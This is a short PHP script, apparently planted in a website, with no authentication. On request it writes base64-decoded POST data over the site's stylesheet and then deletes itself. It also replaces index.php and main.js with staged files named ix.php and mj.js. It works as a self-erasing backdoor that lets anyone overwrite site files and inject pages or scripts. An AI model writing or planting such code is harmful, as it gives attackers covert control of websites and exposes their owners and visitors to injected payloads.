<?php
$fn = $_GET['f'] ?? '';
if ($fn === 'css' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    file_put_contents(__DIR__.'/assets/css/style.css', base64_decode($_POST['d']));
    echo 'CSS OK';
    @unlink(__FILE__);
    exit;
}
if ($fn === 'go') {
    if (file_exists(__DIR__.'/ix.php')) { copy(__DIR__.'/ix.php', __DIR__.'/index.php'); unlink(__DIR__.'/ix.php'); }
    if (file_exists(__DIR__.'/mj.js'))  { copy(__DIR__.'/mj.js', __DIR__.'/assets/js/main.js'); unlink(__DIR__.'/mj.js'); }
    echo 'JS+INDEX OK';
    exit;
}
echo 'ready';